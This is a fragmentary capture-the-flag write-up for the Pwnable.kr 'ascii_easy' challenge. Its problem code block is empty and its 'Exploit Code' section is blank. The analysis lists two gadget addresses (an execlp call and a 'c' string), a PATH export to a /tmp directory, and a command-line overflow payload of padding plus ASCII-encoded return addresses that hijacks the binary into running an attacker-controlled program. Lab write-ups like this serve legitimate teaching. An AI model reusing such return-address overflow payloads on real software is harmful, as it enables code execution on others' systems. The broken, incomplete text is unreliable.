# Pwnable.kr ascii_easy CTF Writeup

## Problem Description  
The code provided for the challenge is as follows:

```c
```

## Analysis  

```asm
0x00b8a7f : nop; execlp
0x000973c : 63 00 (c /0)

export PATH="$PATH:/tmp/dalal"
./ascii_easy 'AAAAAAAAAAAAAAAAAAAABBBB@jaU<wVU'
```
## Exploit Code
